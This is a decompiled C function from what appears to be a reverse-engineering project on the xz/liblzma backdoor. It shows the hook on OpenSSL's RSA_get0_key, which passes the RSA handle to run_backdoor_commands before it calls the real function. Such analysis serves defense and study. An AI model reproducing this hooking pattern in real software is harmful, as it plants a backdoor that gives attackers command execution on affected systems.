// /home/kali/xzre-ghidra/xzregh/10A330_hook_RSA_get0_key.c
// Function: hook_RSA_get0_key @ 0x10A330
// Calling convention: __stdcall
// Prototype: void __stdcall hook_RSA_get0_key(RSA * r, BIGNUM * * n, BIGNUM * * e, BIGNUM * * d)


/*
 * AutoDoc: Generated from reverse engineering.
 *
 * Summary:
 *   Wrapper around RSA_get0_key that lets the backdoor observe RSA key material before delegating to the real implementation.
 *
 * Notes:
 *   - Grabs the function pointer from global_ctx->imported_funcs and returns immediately if it is missing.
 *   - Calls run_backdoor_commands() with the RSA handle, then jumps to the genuine RSA_get0_key entry point.
 */

void hook_RSA_get0_key(RSA *r,BIGNUM **n,BIGNUM **e,BIGNUM **d)

{
  _func_32 *UNRECOVERED_JUMPTABLE;
  BOOL local_1c;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->RSA_get0_key_null,
     UNRECOVERED_JUMPTABLE != (_func_32 *)0x0)) {
    if (r != (RSA *)0x0) {
      run_backdoor_commands(r,global_ctx,&local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)(r,n,e,d);
    return;
  }
  return;
}

